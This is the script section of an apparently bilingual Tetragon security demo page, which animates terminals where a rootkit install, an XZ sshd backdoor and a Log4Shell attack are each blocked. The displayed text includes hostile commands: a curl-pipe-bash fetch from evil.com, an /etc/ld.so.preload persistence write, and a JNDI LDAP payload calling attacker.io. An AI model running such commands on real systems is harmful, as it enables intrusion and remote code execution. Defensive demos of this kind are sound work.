                termContent.innerHTML += `<div class="terminal-output-line" style="color: var(--cisco-green);">STATUS: deployed (tetragon-agent is now hooking kernel)</div>`;
                
                await new Promise(r => setTimeout(r, 800));
                termContent.innerHTML += `<div><span class="prompt">admin@infra:~$</span> <span class="cmd-text"></span></div>`;
                const secondPrompt = termContent.lastElementChild;
                await typeWriter('kubectl apply -f rootkit-block-policy.yaml', secondPrompt.querySelector('.cmd-text'));
                await new Promise(r => setTimeout(r, 600));
                termContent.innerHTML += `<div class="terminal-output-line" style="color: #61C6E2;">tracingpolicy.cilium.io/protect-system-files created</div>`;

                // [ENHANCED] Added real verification step
                await new Promise(r => setTimeout(r, 800));
                termContent.innerHTML += `<div><span class="prompt">admin@infra:~$</span> <span class="cmd-text"></span></div>`;
                const thirdPrompt = termContent.lastElementChild;
                await typeWriter('kubectl get pods -n kube-system -l app.kubernetes.io/name=tetragon', thirdPrompt.querySelector('.cmd-text'));
                await new Promise(r => setTimeout(r, 400));
                termContent.innerHTML += `<div class="terminal-output-line">tetragon-dbj2x   1/1     Running   0     45s</div>`;

            } else {
                await typeWriter('curl -L https://github.com/cilium/tetragon/releases/download/v1.1.0/tetragon-linux-amd64.tar.gz | tar xz', cmd1);
                await new Promise(r => setTimeout(r, 600));
                termContent.innerHTML += `<div class="terminal-output-line">Extracting binaries...</div>`;
                
                await new Promise(r => setTimeout(r, 800));
                termContent.innerHTML += `<div><span class="prompt">admin@infra:~$</span> <span class="cmd-text"></span></div>`;
                const secondPrompt = termContent.lastElementChild;
                await typeWriter('sudo ./tetragon --bpf-lib ./bpf --config-file policy.yaml &', secondPrompt.querySelector('.cmd-text'));
                await new Promise(r => setTimeout(r, 400));
                termContent.innerHTML += `<div class="terminal-output-line" style="color: var(--cisco-green);">Tetragon started. Kernel hooks active on /sys/fs/bpf/tetragon</div>`;
            }

            activateShield('0'); // Update Status Label
            termContent.innerHTML += `<div class="terminal-output-line" style="font-weight:bold; color: var(--cisco-blue); margin-top:10px;">✅ Tetragon 准备就绪，可以开始后续攻防演练。</div>`;
            termContent.innerHTML += `<div><span class="prompt">admin@infra:~$</span> <span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
            btn.disabled = false;
        }

        // Scenario 1: Rootkit Simulation
        async function runAttackSequence() {
            const btn = document.getElementById('attackBtn');
            const termContent = document.getElementById('termOutput');
            btn.disabled = true;
            resetTerminal('termOutput');
            activateShield('1'); // [ENHANCED] Active Enforcing Status

            // Line 1: User types download command
            const firstPrompt = termContent.lastElementChild;
            firstPrompt.querySelector('.cursor').style.display = 'none';
            let cmd1 = document.createElement('span');
            cmd1.className = "cmd-text";
            firstPrompt.appendChild(cmd1);

            await typeWriter('curl -fsSL http://evil.com/setup.sh | bash', cmd1);
            await new Promise(r => setTimeout(r, 600));

            const connectingText = currentLang === 'zh' ? '> 正在连接 evil.com...' : '> Connecting to evil.com...';
            termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">${connectingText}</div>`;
            await new Promise(r => setTimeout(r, 800));

            const warningText = currentLang === 'zh' 
                ? '[Tetragon] ⚠️ 检测到可疑网络连接 (curl -> evil.com:80)'
                : '[Tetragon] ⚠️ Suspicious network connection detected (curl -> evil.com:80)';
            termContent.innerHTML += `<div class="output-text" style="color: var(--cisco-orange); border-left: 2px solid var(--cisco-orange); padding-left: 8px;">${warningText}</div>`;
            
            await new Promise(r => setTimeout(r, 800));

            // Line 2: User types persistence command
            termContent.innerHTML += `<div><span class="prompt">root@prod-db:~#</span> <span class="cmd-text"></span></div>`;
            const secondPrompt = termContent.lastElementChild;
            let cmd2 = secondPrompt.querySelector('.cmd-text');
            await typeWriter('echo "root_kit" >> /etc/ld.so.preload', cmd2);
            await new Promise(r => setTimeout(r, 600));

            triggerShieldEffect('term-wrap-1'); // [ENHANCED] Shield Watermark

            const killText = currentLang === 'zh'
                ? "进程 'bash' (pid=1402) 已被 SIGKILL 终止"
                : "Process 'bash' (pid=1402) killed by SIGKILL";
            termContent.innerHTML += `
                <div style="margin-top: 8px; margin-bottom: 8px;">
                    <span class="alert-text">BLOCK</span> 
                    <span style="color: #FF5F56;">${killText}</span>
                </div>
                <div class="json-log-view">JSON Log: {"policy": "protect-system-files", "action": "sigkill", "syscall": "openat", "file": "/etc/ld.so.preload"}</div>
            `;

            termContent.innerHTML += `<div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
            btn.disabled = false;
        }

        // Scenario 2: XZ Utils Simulation
        async function runXZSimulation() {
            const btn = document.getElementById('xzBtn');
            const termContent = document.getElementById('xzOutput');
            btn.disabled = true;
            resetTerminal('xzOutput');
            activateShield('2'); // [ENHANCED] Active Enforcing Status

            const firstPrompt = termContent.lastElementChild;
            firstPrompt.querySelector('.cursor').style.display = 'none';
            let cmd1 = document.createElement('span');
            cmd1.className = "cmd-text";
            firstPrompt.appendChild(cmd1);

            await typeWriter('ssh attacker@prod-node -p 22', cmd1);
            await new Promise(r => setTimeout(r, 600));

            termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">IFUNC resolution hijacking sshd... backdoor signature matched!</div>`;
            termContent.innerHTML += `<div class="output-text">attacker@prod-node:~$</div>`;
            
            await new Promise(r => setTimeout(r, 800));

            termContent.innerHTML += `<div><span class="prompt">attacker@prod-node:~$</span> <span class="cmd-text"></span></div>`;
            const secondPrompt = termContent.lastElementChild;
            let cmd2 = secondPrompt.querySelector('.cmd-text');
            await typeWriter('id', cmd2); 
            await new Promise(r => setTimeout(r, 400));

            triggerShieldEffect('term-wrap-2'); // [ENHANCED] Shield Watermark

            termContent.innerHTML += `
                <div style="margin-top: 8px; margin-bottom: 8px;">
                    <span class="alert-text">KILL</span> 
                    <span style="color: #FF5F56;">Tetragon killed sshd (PID 3012). Attempted fork(/bin/sh) blocked via LSM.</span>
                </div>
                <div class="json-log-view">JSON Log: {"policy": "block-sshd-fork", "action": "sigkill", "source": "sshd", "target": "/bin/sh"}</div>
            `;

            termContent.innerHTML += `<div><span class="prompt">root@prod-node:~$</span> <span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
            btn.disabled = false;
        }

        // Scenario 3: Log4j Simulation
        async function runLog4jSimulation() {
            const btn = document.getElementById('log4jBtn');
            const termContent = document.getElementById('log4jOutput');
            btn.disabled = true;
            resetTerminal('log4jOutput');
            activateShield('3'); // [ENHANCED] Active Enforcing Status

            const firstPrompt = termContent.lastElementChild;
            firstPrompt.querySelector('.cursor').style.display = 'none';
            let cmd1 = document.createElement('span');
            cmd1.className = "cmd-text";
            firstPrompt.appendChild(cmd1);

            await typeWriter('curl -H "User-Agent: ${jndi:ldap://attacker.io/X}" http://api-gw', cmd1);
            await new Promise(r => setTimeout(r, 600));

            termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">Log4j parsing payload... callback initiated to attacker.io</div>`;
            termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">Loading malicious Java class from remote LDAP...</div>`;
            
            await new Promise(r => setTimeout(r, 1000));

            triggerShieldEffect('term-wrap-3'); // [ENHANCED] Shield Watermark

            termContent.innerHTML += `
                <div style="margin-top: 8px; margin-bottom: 8px;">
                    <span class="alert-text">SIGKILL</span> 
                    <span style="color: #FF5F56;">Tetragon killed Java PID 550. Blocked fork(/usr/bin/whoami) in kernel.</span>
                </div>
                <div class="json-log-view">JSON Log: {"policy": "block-java-fork", "action": "sigkill", "exploit": "CVE-2021-44228", "binary": "/usr/bin/whoami"}</div>
            `;

            termContent.innerHTML += `<div><span class="prompt">root@java-app:~$</span> <span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
            btn.disabled = false;
        }
    </script>
</body>
</html>